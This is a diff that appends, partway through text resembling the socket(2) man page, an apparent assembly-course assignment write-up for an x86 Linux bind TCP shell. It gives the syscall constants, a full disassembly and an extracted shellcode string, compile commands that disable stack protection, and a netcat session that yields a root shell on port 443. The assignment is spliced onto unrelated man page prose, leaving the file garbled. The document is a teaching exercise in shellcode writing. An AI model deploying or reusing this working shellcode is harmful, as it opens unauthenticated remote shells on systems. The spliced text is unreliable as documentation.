@@ -168,4 +168,126 @@ Once  connected,  data  may  be  transferred  using read(2)  and  write(2)  call
 When a session has been completed a close(2) may be performed. Out-of-band data may also be transmitted as described in send(2) and 
 received as described in recv(2).
 
-The communications protocols which implement a SOCK_STREAM ensure that data is not lost or duplicated.
+The communications protocols which implement a SOCK_STREAM ensure that data is not lost or duplicated. For prepare the NASM code, we 
+need to follow the steps:
+
+EAX should always contain 0x66 (or 102), which is the number of socketcall() defined in the linux headers.
+We need to bind the socket. 
+For sys_bind information (value) we found:
+
+cat /usr/include/linux/net.h
+
+#define SYS_SOCKET 1 /* sys_socket(2) */
+#define SYS_BIND 2 /* sys_bind(2) */
+#define SYS_CONNECT 3 /* sys_connect(2) */
+#define SYS_LISTEN 4 /* sys_listen(2) */
+#define SYS_ACCEPT 5 /* sys_accept(2) */
+
+TCP protocol number  will be (0) because of
+cat /usr/include/netinet/in.h
+IPPROTO_IP = 0, /* Dummy protocol for TCP. */
+The value of AF_INET will be 2 
+
+The  addrlen needs to be 16 because of
+
+cat /usr/include/linux/in.h
+
+/* Structure describing an Internet (IP) socket address. */
+#if __UAPI_DEF_SOCKADDR_IN
+#define __SOCK_SIZE__ 16 /* sizeof(struct sockaddr) */
+struct sockaddr_in {
+__kernel_sa_family_t sin_family; /* Address family */
+__be16 sin_port; /* Port number */
+struct in_addr sin_addr; /* Internet address */
+
+dup2 syscall is 63.
+
+So after complete NASM file we need may perform following steps:
+
+Step 1: Prepare the nasm file 
+
+root@kali:/home/SLAE/Assignment1# objdump -D Assignment1_Shell_Bind_TCP -M intel
+
+Assignment1_Shell_Bind_TCP:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+08048060 <_start>:
+ 8048060:       31 db                   xor    ebx,ebx
+ 8048062:       f7 e3                   mul    ebx
+ 8048064:       b0 66                   mov    al,0x66
+ 8048066:       b3 01                   mov    bl,0x1
+ 8048068:       52                      push   edx
+ 8048069:       53                      push   ebx
+ 804806a:       6a 02                   push   0x2
+ 804806c:       89 e1                   mov    ecx,esp
+ 804806e:       cd 80                   int    0x80
+ 8048070:       89 c2                   mov    edx,eax
+ 8048072:       31 ff                   xor    edi,edi
+ 8048074:       b0 66                   mov    al,0x66
+ 8048076:       b3 02                   mov    bl,0x2
+ 8048078:       57                      push   edi
+ 8048079:       66 68 15 38             pushw  0x3815
+ 804807d:       66 6a 02                pushw  0x2
+ 8048080:       89 e1                   mov    ecx,esp
+ 8048082:       6a 10                   push   0x10
+ 8048084:       51                      push   ecx
+ 8048085:       52                      push   edx
+ 8048086:       89 e1                   mov    ecx,esp
+ 8048088:       cd 80                   int    0x80
+ 804808a:       b0 66                   mov    al,0x66
+ 804808c:       b3 04                   mov    bl,0x4
+ 804808e:       57                      push   edi
+ 804808f:       52                      push   edx
+ 8048090:       89 e1                   mov    ecx,esp
+ 8048092:       cd 80                   int    0x80
+ 8048094:       b0 66                   mov    al,0x66
+ 8048096:       b3 05                   mov    bl,0x5
+ 8048098:       57                      push   edi
+ 8048099:       57                      push   edi
+ 804809a:       52                      push   edx
+ 804809b:       89 e1                   mov    ecx,esp
+ 804809d:       cd 80                   int    0x80
+ 804809f:       89 c2                   mov    edx,eax
+ 80480a1:       89 d3                   mov    ebx,edx
+ 80480a3:       31 c9                   xor    ecx,ecx
+
+080480a5 <dup2>:
+ 80480a5:       b0 3f                   mov    al,0x3f
+ 80480a7:       cd 80                   int    0x80
+ 80480a9:       fe c1                   inc    cl
+ 80480ab:       80 f9 03                cmp    cl,0x3
+ 80480ae:       74 02                   je     80480b2 <xbshell>
+ 80480b0:       eb f3                   jmp    80480a5 <dup2>
+
+080480b2 <xbshell>:
+ 80480b2:       31 c9                   xor    ecx,ecx
+ 80480b4:       f7 e1                   mul    ecx
+ 80480b6:       51                      push   ecx
+ 80480b7:       68 6e 2f 73 68          push   0x68732f6e
+ 80480bc:       68 2f 2f 62 69          push   0x69622f2f
+ 80480c1:       89 e3                   mov    ebx,esp
+ 80480c3:       b0 0b                   mov    al,0xb
+ 80480c5:       cd 80                   int    0x80
+
+Step 2: Obtain the shellcode from nasm file
+
+root@kali:/home/SLAE/Assignment1# objdump -d ./Assignment1_Shell_Bind_TCP|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xdb\xf7\xe3\xb0\x66\xb3\x01\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\x31\xff\xb0\x66\xb3\x02\x57\x66\x68\x15\x38\x66\x6a\x02\x89\xe1\x6a\x10\x51\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x04\x57\x52\x89\xe1\xcd\x80\xb0\x66\xb3\x05\x57\x57\x52\x89\xe1\xcd\x80\x89\xc2\x89\xd3\x31\xc9\xb0\x3f\xcd\x80\xfe\xc1\x80\xf9\x03\x74\x02\xeb\xf3\x31\xc9\xf7\xe1\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"
+
+Step 3: compile & execute 
+
+root@kali:/home/SLAE/Assignment1#  gcc -fno-stack-protector -z execstack shellcode_modify_port_443.c -o Shell_Bind_TCP_port443
+root@kali:/home/SLAE/Assignment1# ./Shell_Bind_TCP_port443
+
+we will get a bind TCP shell:
+
+root@kali:~# nc 127.0.0.1 443
+id
+uid=0(root) gid=0(root) groups=0(root)
+echo SLAE
+SLAE
+
+
+
